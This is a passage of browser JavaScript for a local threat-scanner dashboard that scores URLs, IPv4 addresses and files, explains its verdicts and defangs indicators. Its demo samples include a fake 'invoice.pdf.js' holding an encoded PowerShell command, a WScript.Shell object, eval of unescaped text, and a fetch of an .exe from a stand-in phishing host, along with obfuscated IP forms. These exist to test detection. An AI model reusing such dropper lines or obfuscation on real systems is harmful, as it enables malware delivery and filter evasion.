  for (const u2 of urls) {
    try {
      const r = analyzeURL(u2);
      const v = verdictOf(r.score);
      if (v === "Malicious") bad++;
      if (v === "Suspicious") sus++;
      urows.push([u2, v, r.score]);
    } catch {}
  }
  if (urows.length)
    extra.push({
      title: "URLs found in file",
      head: ["URL", "Verdict", "Score"],
      rows: urows,
      v: 1,
    });
  if (bad)
    add(
      "High",
      30,
      bad + " malicious URL(s) embedded",
      "Links inside this file score as malicious under the URL engine.",
    );
  else if (sus)
    add(
      "Medium",
      12,
      sus + " suspicious URL(s) embedded",
      "Some links inside the file show phishing or obfuscation traits.",
    );
  const ips = [
    ...new Set(
      (L.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []).filter((x) =>
        parseIPv4(x),
      ),
    ),
  ].slice(0, 10);
  const pubIps = ips.filter((x) =>
    ipScope(parseIPv4(x).o)[0].startsWith("Public"),
  );
  if (pubIps.length)
    add(
      "Low",
      5,
      pubIps.length + " hard-coded public IP(s)",
      "Embedded IPs can be command-and-control servers.",
    );
  const sha256 = await hash("SHA-256", buf),
    sha1 = await hash("SHA-1", buf);
  const props = [
    ["File name", name],
    ["Size", file.size.toLocaleString() + " bytes"],
    ["Detected type", tdesc],
    ["Extension", "." + (ext || "none")],
    ["Browser-reported MIME", file.type || "unknown"],
    ["Entropy", ent.toFixed(2) + " / 8"],
    ["Last modified", new Date(file.lastModified).toISOString()],
    [
      "Magic bytes",
      [...u.subarray(0, 8)]
        .map((b) => b.toString(16).padStart(2, "0"))
        .join(" "),
    ],
  ];
  extra.unshift({
    title: "File properties",
    head: ["Property", "Value"],
    rows: props,
    plain: 1,
  });
  const score = Math.min(100, pts),
    v = verdictOf(score);
  return {
    kind: "file",
    text: name,
    score,
    reasons: R,
    evidence: ev,
    extra,
    features: null,
    spans: [],
    category: R.some((r) => /executable|inject|packed|archive/i.test(r.title))
      ? "Malware / dropper"
      : R.some((r) => /URL|macro|PDF|script|Script|JavaScript/.test(r.title))
        ? "Phishing / malicious document"
        : "None detected",
    brand: "",
    iocs: [
      ["SHA-256", sha256],
      ["SHA-1", sha1],
      ...pubIps.map((x) => ["IP", x]),
      ...urls
        .slice(0, 5)
        .map((x) => ["URL", x.replace(/^http/i, "hxxp").replace(/\./g, "[.]")]),
    ],
  };
}

/* ---------- IP analyzer ---------- */
function analyzeIP(input) {
  const s = input.trim();
  if (!s) throw "Enter an IPv4 address to analyze.";
  if (/:/.test(s))
    throw "IPv6 is not supported in this demo. Enter an IPv4 address such as 203.0.113.7.";
  const ip = parseIPv4(s);
  if (!ip)
    throw "This is not a valid IPv4 address. Use four numbers from 0 to 255, e.g. 203.0.113.7.";
  const o = ip.o,
    R = [];
  let pts = 0;
  const add = (sev, p, t, x) => {
    R.push({ sev, title: t, text: x });
    pts += p;
  };
  const [scope, sr] = ipScope(o),
    dot = o.join(".");
  if (ip.enc)
    add(
      "High",
      35,
      "Obfuscated notation",
      '"' +
        s +
        '" is a non-standard way to write ' +
        dot +
        ". Browsers and OS resolvers accept these forms, which attackers use to bypass filters.",
    );
  if (/(^|\.)0\d/.test(s) && !/0x/i.test(s))
    add(
      "Medium",
      10,
      "Leading zeros (octal ambiguity)",
      'Some software reads "010" as octal 8, others as decimal 10, which enables SSRF/filter bypass.',
    );
  if (o[0] === 0)
    add(
      "Medium",
      30,
      "Invalid source/destination",
      "0.0.0.0/8 is not a valid host address.",
    );
  if (o[0] >= 240)
    add(
      "High",
      40,
      "Reserved / never-assigned range",
      "Traffic from this range is bogon traffic and is almost always spoofed or misconfigured.",
    );
  if (o[0] === 169 && o[1] === 254)
    add(
      "Medium",
      40,
      "Link-local range",
      "Often used in cloud metadata SSRF (169.254.169.254).",
    );
  if (o[0] >= 224 && o[0] <= 239)
    add(
      "Medium",
      25,
      "Multicast address",
      "Not valid as a normal server address.",
    );
  if (
    o[0] === 127 ||
    o[0] === 10 ||
    (o[0] === 172 && o[1] >= 16 && o[1] <= 31) ||
    (o[0] === 192 && o[1] === 168)
  )
    add(
      "Low",
      8,
      "Non-routable internal address",
      "Cannot be reached from the internet. If a public link points here it may be an SSRF or local-pivot attempt.",
    );
  if (o.every((x) => x === o[0]) && o[0] !== 0)
    add(
      "Low",
      5,
      "Repeating pattern",
      "All octets equal; typical of placeholder or test values.",
    );
  if (/^(0|[1-9]\d*)$/.test(s) && s.length > 3)
    add(
      "High",
      0,
      "Integer notation",
      "The whole address is written as one decimal number.",
    );
  const ints = o[0] * 16777216 + o[1] * 65536 + o[2] * 256 + o[3];
  const cls =
    o[0] < 128
      ? "A"
      : o[0] < 192
        ? "B"
        : o[0] < 224
          ? "C"
          : o[0] < 240
            ? "D (multicast)"
            : "E (reserved)";
  const score = Math.min(100, pts);
  return {
    kind: "ip",
    text: dot,
    score,
    reasons: R,
    spans: [],
    extra: [
      {
        title: "Address details",
        plain: 1,
        head: ["Property", "Value"],
        rows: [
          ["Normalized", dot],
          ["Scope", scope],
          ["Class", cls],
          ["Decimal", ints],
          [
            "Hex",
            "0x" + o.map((x) => x.toString(16).padStart(2, "0")).join(""),
          ],
          ["Binary", o.map((x) => x.toString(2).padStart(8, "0")).join(".")],
          ["Reverse DNS name", o.slice().reverse().join(".") + ".in-addr.arpa"],
          ["Input as typed", s],
        ],
      },
    ],
    category: score > 70 ? "Suspicious infrastructure" : "None detected",
    brand: "",
    iocs: [
      ["IPv4", dot],
      ["Defanged", dot.replace(/\./g, "[.]")],
    ],
  };
}

/* ================= LIVE LAYER ================= */
const g = (id) => document.getElementById(id),
  inp = g("inp");
const COLV = {
    Safe: "var(--safe)",
    Suspicious: "var(--warn)",
    Malicious: "var(--bad)",
  },
  RK = { High: 0, Medium: 1, Low: 2 };
const ST = {
  n: 0,
  Safe: 0,
  Suspicious: 0,
  Malicious: 0,
  sum: 0,
  scores: [],
  times: [],
  sig: {},
};
let mode = "url",
  paused = false,
  speed = 1400,
  tick = null,
  typing = null,
  liveT = null,
  idleT = null,
  lastCommit = "",
  cur = null;
const cls = (c) =>
  c === "Malicious" || c === "High"
    ? "r-High"
    : c === "Suspicious" || c === "Medium"
      ? "r-Medium"
      : "r-Low";
const tbl = (h, rows, ci = -1) =>
  '<div class="scroll"><table><tr>' +
  h.map((x) => "<th>" + x + "</th>").join("") +
  "</tr>" +
  rows
    .map(
      (r) =>
        "<tr>" +
        r
          .map(
            (c, i) =>
              '<td class="' +
              (i === ci ? cls(c) : i ? "m" : "") +
              '">' +
              esc(c) +
              "</td>",
          )
          .join("") +
        "</tr>",
    )
    .join("") +
  "</table></div>";
const sec = (t, b) => '<div class="sec"><h4>' + t + "</h4>" + b + "</div>";
const copy = (t) => {
  try {
    navigator.clipboard.writeText(t);
  } catch {
    const a = document.createElement("textarea");
    a.value = t;
    document.body.appendChild(a);
    a.select();
    try {
      document.execCommand("copy");
    } catch {}
    a.remove();
  }
};
const ACTIONS = {
  Safe: [
    "No strong risk signals found, but local rules cannot prove safety.",
    "Avoid entering passwords on pages reached through email or messages.",
  ],
  Suspicious: [
    "Do not enter credentials or payment details.",
    "Verify the sender through a separate channel.",
    "Open only in an isolated browser or sandbox if you must.",
    "Consider reporting it to your security team.",
  ],
  Malicious: [
    "Do not open, run or click it.",
    "Block the domain, hash or IP at your firewall, proxy or mail gateway.",
    "Report it (SOC, PhishTank, Google Safe Browsing).",
    "If someone already opened it, reset exposed passwords and scan the device.",
  ],
};

function hlURL(r) {
  const t = r.text,
    n = t.length,
    cl = new Array(n).fill(null),
    rank = { High: 3, Medium: 2, Low: 1 };
  r.spans.forEach((sp) => {
    for (let i = sp.a; i < Math.min(sp.b, n); i++)
      if (!cl[i] || rank[sp.sev] > rank[cl[i].sev]) cl[i] = sp;
  });
  let h = "",
    i = 0;
  while (i < n) {
    const c = cl[i];
    let j = i;
    while (j < n && cl[j] === c) j++;
    const s = esc(t.slice(i, j));
    h += c
      ? '<mark class="' +
        c.sev +
        '" title="' +
        esc(c.sev + ": " + c.msg) +
        '">' +
        s +
        "</mark>"
      : s;
    i = j;
  }
  return h;
}
function tween(el, to) {
  const from = +el.dataset.v || 0,
    t0 = performance.now();
  el.dataset.v = to;
  const st = (t) => {
    const p = Math.min(1, (t - t0) / 350);
    el.textContent = Math.round(from + (to - from) * p);
    if (p < 1) requestAnimationFrame(st);
  };
  requestAnimationFrame(st);
}

function show(r) {
  r.verdict = verdictOf(r.score);
  cur = r;
  const fg = g("fg");
  fg.style.stroke = COLV[r.verdict];
  fg.style.strokeDashoffset = 327 - (327 * r.score) / 100;
  tween(g("num"), r.score);
  g("vd").className = "verdict v-" + r.verdict;
  g("vd").textContent = r.verdict;
  g("meta").innerHTML =
    "Category: <b>" +
    esc(r.category) +
    "</b>" +
    (r.brand ? "<br>Targeted brand: <b>" + esc(r.brand) + "</b>" : "") +
    "<br><b>" +
    r.reasons.length +
    "</b> signal(s) from the local rule engine";
  let h = "";
  if (r.kind === "url")
    h += sec(
      'Pinpointed evidence <span class="skip">(hover a highlight)</span>',
      '<div class="hl">' + hlURL(r) + "</div>",
    );
  h += sec(
    "Why this verdict",
    r.reasons.length
      ? [...r.reasons]
          .sort((a, b) => RK[a.sev] - RK[b.sev])
          .map(
            (x) =>
              '<div class="reason ' +
              x.sev +
              '"><span class="tag ' +
              x.sev +
              '">' +
              x.sev +
              "</span><b>" +
              esc(x.title) +
              "</b><p>" +
              esc(x.text) +
              "</p></div>",
          )
          .join("")
      : '<p class="skip" style="margin:0">No risk signals triggered.</p>',
  );
  if (r.evidence && r.evidence.length)
    h += sec(
      "Pinpointed locations in file",
      tbl(
        ["Severity", "Finding", "Line", "Offset", "Snippet"],
        r.evidence.slice(0, 25).map((e) => [e.sev, e.t, e.line, e.off, e.snip]),
        0,
      ),
    );
  (r.extra || []).forEach((e) => {
    h += sec(
      e.title,
      tbl(
        e.head,
        e.rows,
        e.head.includes("Risk")
          ? e.head.length - 1
          : e.head.includes("Verdict")
            ? 1
            : -1,
      ),
    );
  });
  if (r.kind === "url") {
    const P = r.parsed;
    h += sec(
      "Details",
      "<details><summary>Parsed components</summary>" +
        tbl(
          ["Component", "Value"],
          Object.entries(P).map(([k, v]) => [k, v || "—"]),
        ) +
        '</details><details style="margin-top:8px"><summary>Feature table</summary>' +
        tbl(["Feature", "Value", "Risk"], r.features, 2) +
        "</details>",
    );
  }
  const iocs = r.iocs || [
    ["Domain", ((r.parsed && r.parsed.host) || "n/a").replace(/\./g, "[.]")],
    ["Defanged URL", r.text.replace(/^http/i, "hxxp").replace(/\./g, "[.]")],
  ];
  h += sec(
    "Indicators of compromise",
    iocs
      .map(
        ([k, v]) =>
          '<div class="ioc"><span>' +
          esc(k) +
          "</span><code>" +
          esc(v) +
          '</code><button class="mini" data-copy="' +
          esc(v) +
          '">Copy</button></div>',
      )
      .join(""),
  );
  h += sec(
    "Recommended actions",
    '<ul class="act">' +
      ACTIONS[r.verdict].map((a) => "<li>" + a + "</li>").join("") +
      '</ul><div class="chips"><button class="mini" id="cj">Copy report JSON</button></div>',
  );
  g("detail").innerHTML = h;
}
function reset() {
  g("fg").style.strokeDashoffset = 327;
  g("fg").style.stroke = "var(--mut)";
  tween(g("num"), 0);
  g("vd").className = "verdict";
  g("vd").textContent = "Waiting for input";
  g("meta").textContent =
    "Start typing a URL or IP, pick a sample, or drop a file.";
  g("detail").innerHTML = "";
  cur = null;
}

/* ---- live analysis while typing ---- */
function run() {
  const v = inp.value;
  if (!v.trim()) {
    reset();
    g("err").textContent = "";
    return;
  }
  try {
    show(mode === "ip" ? analyzeIP(v) : analyzeURL(v));
    g("err").textContent = "";
  } catch (e) {
    cur = null;
    g("err").textContent = typeof e === "string" ? e : e.message;
  }
}
function commitNow() {
  if (cur && cur.kind === mode && cur.text !== lastCommit) {
    lastCommit = cur.text;
    record(cur, "you");
  }
}
function live() {
  clearTimeout(liveT);
  liveT = setTimeout(run, 80);
}
inp.addEventListener("input", (e) => {
  if (e.isTrusted) clearInterval(typing);
  live();
});
inp.addEventListener("blur", () => {
  clearTimeout(liveT);
  run();
  commitNow();
});
inp.addEventListener("paste", () =>
  setTimeout(() => {
    run();
    commitNow();
  }, 60),
);
inp.addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    clearTimeout(liveT);
    run();
    commitNow();
  }
});
function typeInto(s) {
  clearInterval(typing);
  inp.value = "";
  let i = 0;
  typing = setInterval(() => {
    inp.value = s.slice(0, ++i);
    run();
    if (i >= s.length) {
      clearInterval(typing);
      commitNow();
    }
  }, 24);
}

async function handleFile(f) {
  if (!f) return;
  g("fn").textContent = f.name + " (" + f.size.toLocaleString() + " bytes)";
  g("err").textContent = "";
  g("detail").innerHTML =
    '<div class="empty"><div class="spin"></div>Analyzing ' +
    esc(f.name) +
    "…</div>";
  try {
    const r = await analyzeFile(f);
    show(r);
    record(r, "you");
  } catch (e) {
    g("detail").innerHTML = "";
    g("err").textContent =
      typeof e === "string" ? e : "Analysis failed: " + e.message;
  }
}

const SAMPLES = {
  url: [
    ["Safe", "https://en.wikipedia.org/wiki/Computer_security"],
    ["Suspicious", "http://secure-login.example-verify.top/account"],
    [
      "Malicious",
      "http://paypa1.secure-login.top@198.51.100.7/verify/update.exe?url=http://example.test",
    ],
  ],
  ip: [
    ["Safe", "203.0.113.7"],
    ["Suspicious", "169.254.169.254"],
    ["Malicious", "0xf0.0x1.0x2.0x3"],
  ],
  file: [
    [
      "Suspicious script sample",
      [
        "invoice.pdf.js",
        'powershell.exe -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\nvar s=new ActiveXObject("WScript.Shell");eval(unescape("%61%6c%65%72%74"));\nfetch("http://paypa1.secure-login.top/verify/update.exe");\nbeacon 203.0.113.50\n',
      ],
    ],
    [
      "Clean text sample",
      [
        "notes.txt",
        "Meeting notes: review the Q3 roadmap at https://en.wikipedia.org/wiki/Roadmap\n",
      ],
    ],
  ],
};
function setMode(k) {
  mode = k;
  clearInterval(typing);
  clearTimeout(liveT);
  clearTimeout(idleT);
  lastCommit = "";
  document
    .querySelectorAll(".seg button")
    .forEach((b) => b.setAttribute("aria-selected", b.dataset.k === k));
  g("f-text").hidden = k === "file";
  g("f-file").hidden = k !== "file";
  g("err").textContent = "";
  g("fn").textContent = "";
  if (k !== "file") {
    inp.value = "";
    inp.placeholder =
      k === "url"
        ? "Paste or type a URL, e.g. https://example.com/login"
        : "e.g. 203.0.113.7 (also 0x7f.1 or 2130706433)";
    g("lbl").textContent =
      k === "url" ? "URL to investigate" : "IPv4 address to investigate";
  }
  const sm = g("smp");
  sm.innerHTML = "";
  SAMPLES[k].forEach(([l, v]) => {
    const b = document.createElement("button");
    b.className = "mini";
    b.textContent = k === "file" ? l : "Try " + l.toLowerCase();
    b.onclick = () =>
      k === "file" ? handleFile(new File([v[1]], v[0])) : typeInto(v);
    sm.appendChild(b);
  });
  reset();
}
document
  .querySelectorAll(".seg button")
  .forEach((b) => (b.onclick = () => setMode(b.dataset.k)));
const dr = g("drop"),
  fi = g("fi");
dr.onclick = () => fi.click();
dr.onkeydown = (e) => {
  if (e.key === "Enter") fi.click();
};
fi.onchange = () => {
  handleFile(fi.files[0]);
  fi.value = "";
};
dr.ondragover = (e) => {
  e.preventDefault();
  dr.classList.add("on");
};
dr.ondragleave = () => dr.classList.remove("on");
dr.ondrop = (e) => {
  e.preventDefault();
  dr.classList.remove("on");
  handleFile(e.dataTransfer.files[0]);
};
document.addEventListener("click", (e) => {
  const c = e.target.closest("[data-copy]");
  if (c) {
    copy(c.dataset.copy);
    c.textContent = "Copied";
    setTimeout(() => (c.textContent = "Copy"), 1200);
  }
  if (e.target.id === "cj") {
    copy(JSON.stringify(cur, null, 2));
    e.target.textContent = "Copied";
  }
});

/* ---- monitor: record, feed, stats ---- */
const short = (s) => (s.length > 60 ? s.slice(0, 58) + "…" : s);
function record(r, src) {
  r.verdict = verdictOf(r.score);
  ST.n++;
  ST[r.verdict]++;
  ST.sum += r.score;
  ST.scores.push(r.score);
  if (ST.scores.length > 40) ST.scores.shift();
  r.reasons.forEach((x) => {
    const k = x.title.replace(/\s*[(:"].*$/, "").trim();
    ST.sig[k] = (ST.sig[k] || 0) + 1;
  });
  const b = document.createElement("button");
  b.className = "fi " + r.verdict + (src === "you" ? " you" : "");
  b.innerHTML =
    '<span class="ft m">' +
    new Date().toLocaleTimeString([], { hour12: false }) +
    '</span><span class="fk m">' +
    r.kind.toUpperCase() +
    '</span><span class="fx m">' +
    esc(short(r.text)) +
    '</span><span class="fs m" style="color:' +
    COLV[r.verdict] +
    '">' +
    r.score +
    "</span>";
  b.onclick = () => inspect(r);
  const f = g("feed");
  f.prepend(b);
  while (f.children.length > 60) f.lastChild.remove();
  if (r.verdict === "Malicious") {
    const a = g("alert");
    a.className = "hot";
    a.textContent =
      "Latest alert: " + short(r.text) + " (score " + r.score + ")";
  }
  drawStats();
}
function inspect(r) {
  if (r.kind === "file") {
    setMode("file");
    show(r);
  } else {
    setMode(r.kind);
    inp.value = r.text;
    run();
    lastCommit = r.text;
  }
  g("res").scrollIntoView({ behavior: "smooth", block: "nearest" });
}
function drawStats() {
  const last = ST.scores.slice(-10),
    avg = last.length ? last.reduce((a, b) => a + b, 0) / last.length : 0,
    lv =
      avg > 55
        ? ["CRITICAL", "var(--bad)"]
        : avg > 35
          ? ["ELEVATED", "var(--warn)"]
          : ["LOW", "var(--safe)"];
  const K = [
    ["Scanned", ST.n, ""],
    ["Malicious", ST.Malicious, "var(--bad)"],
    ["Suspicious", ST.Suspicious, "var(--warn)"],
    ["Safe", ST.Safe, "var(--safe)"],
    ["Threat level", ST.n ? lv[0] : "—", ST.n ? lv[1] : ""],
  ];
  g("kpis").innerHTML = K.map(
    ([l, v, c]) =>
      '<div class="kpi"><small>' +
      l +
      '</small><b style="color:' +
      (c || "inherit") +
      (l === "Threat level" ? ";font-size:17px" : "") +
      '">' +
      v +
      "</b></div>",
  ).join("");
  const n = Math.max(1, ST.n);
  g("dist").innerHTML = ["Malicious", "Suspicious", "Safe"]
    .map(
      (k) =>
        '<i style="width:' +
        (ST[k] / n) * 100 +
        "%;background:" +
        COLV[k] +
        '"></i>',
    )
    .join("");
  const W = 300,
    H = 96,
    st = W / 39,
    pts = ST.scores.map((v, i) => [
      W - (ST.scores.length - 1 - i) * st,
      H - 4 - (v * (H - 8)) / 100,
    ]);
  const line = pts
      .map((p) => p[0].toFixed(1) + "," + p[1].toFixed(1))
      .join(" "),
    lp = pts[pts.length - 1];
  g("chart").innerHTML =
    '<line x1="0" x2="300" y1="' +
    (H - 4 - 30 * 0.88) +
    '" y2="' +
    (H - 4 - 30 * 0.88) +
    '" stroke="var(--warn)" stroke-dasharray="3 4" opacity=".5"/><line x1="0" x2="300" y1="' +
    (H - 4 - 70 * 0.88) +
    '" y2="' +
    (H - 4 - 70 * 0.88) +
    '" stroke="var(--bad)" stroke-dasharray="3 4" opacity=".5"/>' +
    (pts.length
      ? '<polyline points="' +
        line +
        '" fill="none" stroke="var(--acc)" stroke-width="2" vector-effect="non-scaling-stroke"/><circle cx="' +
        lp[0] +
        '" cy="' +
        lp[1] +
        '" r="3.5" fill="var(--acc)"/>'
      : "");
  const top = Object.entries(ST.sig)
      .sort((a, b) => b[1] - a[1])
      .slice(0, 5),
    mx = top.length ? top[0][1] : 1;
  g("sigs").innerHTML = top.length
    ? '<h4 class="skip" style="margin:0 0 6px">TOP SIGNALS</h4>' +
      top
        .map(
          ([k, v]) =>
            '<div class="sg"><span>' +
            esc(k) +
            '</span><span><u style="width:' +
            (v / mx) * 100 +
            '%"></u></span><b class="m">' +
            v +
            "</b></div>",
        )
        .join("")
    : "";
}

g("clr").onclick = () => {
  Object.assign(ST, {
    n: 0,
    Safe: 0,
    Suspicious: 0,
    Malicious: 0,
    sum: 0,
    scores: [],
    sig: {},
  });
  g("feed").innerHTML = "";
  g("alert").className = "";
  g("alert").textContent = "No malicious results yet.";
  drawStats();
};
g("flt").onclick = (e) => {
  const f = e.target.dataset.f;
  if (!f) return;
  g("feed").dataset.f = f;
  document
    .querySelectorAll("#flt button")
    .forEach((b) => b.setAttribute("aria-pressed", b === e.target));
};
g("th").onclick = () => {
  const d = document.documentElement,
    dark = d.dataset.theme
      ? d.dataset.theme === "dark"
      : matchMedia("(prefers-color-scheme:dark)").matches;
  d.dataset.theme = dark ? "light" : "dark";
};
function net() {
  const on = navigator.onLine;
  g("netlbl").textContent = on ? "Online" : "Offline (engine still works)";
  g("netdot").className = "dot" + (on ? "" : " off");
}
addEventListener("online", net);
addEventListener("offline", net);
net();

setMode("url");
drawStats();
setInterval(() => {
  g("clock").textContent = new Date().toLocaleTimeString([], { hour12: false });
}, 1000);
